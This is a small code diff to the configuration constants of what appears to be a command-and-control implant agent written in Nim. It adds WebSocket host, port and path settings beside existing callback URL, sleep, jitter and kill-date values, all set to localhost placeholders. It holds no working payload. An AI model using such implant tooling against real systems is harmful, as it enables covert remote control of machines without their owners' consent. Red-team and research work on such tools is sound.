@@ -4,6 +4,9 @@ const
   AgentUUID* = "00000000-0000-0000-0000-000000000000"
   C2BaseUrl* = "http://127.0.0.1:80"
   C2Endpoint* = "/"
+  WsHost* = "127.0.0.1"
+  WsPort* = 7444
+  WsPath* = "ws"
   SleepInterval* = 10
   JitterPercent* = 0
   KillDate* = ""
